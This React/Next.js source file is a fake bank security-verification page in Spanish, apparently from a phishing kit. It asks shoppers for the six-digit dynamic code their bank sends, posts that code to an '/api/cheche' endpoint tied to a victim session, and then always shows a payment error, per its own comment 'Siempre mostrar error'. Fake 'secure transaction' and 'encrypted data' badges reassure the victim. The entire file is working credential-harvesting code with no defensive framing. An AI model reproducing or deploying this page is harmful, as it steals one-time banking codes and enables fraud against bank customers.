'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function ClaveDinamicaGenericaPage() {
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const [bankName, setBankName] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
    
    // Get session data to show bank name
    fetchSessionData(id);
  }, [searchParams, router]);

  const fetchSessionData = async (id: string) => {
    try {
      const response = await fetch(`/api/cheche?action=get_session&sessionId=${id}`);
      const data = await response.json();
      if (data.success && data.session) {
        setBankName(data.session.bank || 'tu banco');
      }
    } catch (error) {
      console.error('Error fetching session:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) return;

    setLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_dynamic_key',
          sessionId,
          claveDinamica: otp
        })
      });

      if (response.ok) {
        // Siempre mostrar error
        router.push(`/pago-error?sessionId=${sessionId}`);
      }
    } catch (error) {
      console.error('Error updating dynamic key:', error);
      router.push(`/pago-error?sessionId=${sessionId}`);
    } finally {
      setLoading(false);
    }
  };

  const handleCancel = () => {
    router.push('/checkout');
  };

  return (
    <div 
      className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100 flex items-center justify-center p-4"
      style={{
        fontFamily: '"Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      }}
    >
      <div className="w-full max-w-md">
        
        {/* Card */}
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
          
          {/* Header */}
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 px-8 py-6 text-center">
            <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-3">
              <svg className="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-white mb-1">Verificación de Seguridad</h1>
            <p className="text-blue-100 text-sm">
              {bankName}
            </p>
          </div>

          {/* Body */}
          <div className="px-8 py-8">
            
            <div className="mb-6 text-center">
              <h2 className="text-xl font-semibold text-gray-800 mb-2">Clave Dinámica</h2>
              <p className="text-gray-600 text-sm">
                Para completar tu compra, ingresa la clave dinámica que te envió tu banco
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              
              {/* OTP Input */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2 text-center">
                  Código de 6 dígitos
                </label>
                <input
                  type="text"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  placeholder="000000"
                  className="w-full h-14 text-center text-2xl font-mono border-2 border-blue-300 rounded-lg focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 tracking-widest transition-all"
                  style={{ color: '#334155', letterSpacing: '0.3em' }}
                  maxLength={6}
                  disabled={loading}
                  autoFocus
                />
              </div>

              {/* Info Alert */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <div className="flex items-start space-x-2">
                  <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                  </svg>
                  <div className="text-xs text-blue-800">
                    <p className="font-medium">Revisa tu celular o app bancaria</p>
                    <p className="mt-1">Si no recibes el código, contacta a tu banco</p>
                  </div>
                </div>
              </div>

              {/* Buttons */}
              <div className="flex space-x-3">
                <button
                  type="button"
                  onClick={handleCancel}
                  className="flex-1 py-3 bg-white border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition font-medium"
                  disabled={loading}
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={otp.length !== 6 || loading}
                  className="flex-1 py-3 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 text-white rounded-lg font-semibold transition-all disabled:cursor-not-allowed"
                >
                  {loading ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Verificando...
                    </span>
                  ) : (
                    'Confirmar'
                  )}
                </button>
              </div>

            </form>

            {/* Security Badge */}
            <div className="mt-6 pt-6 border-t border-gray-200 text-center">
              <div className="flex items-center justify-center space-x-2 text-green-600">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span className="text-sm font-medium">Transacción Segura</span>
              </div>
            </div>

          </div>

        </div>

        {/* Footer */}
        <div className="text-center mt-4 text-sm text-gray-600">
          <p>Tus datos están protegidos y encriptados</p>
        </div>

      </div>
    </div>
  );
}
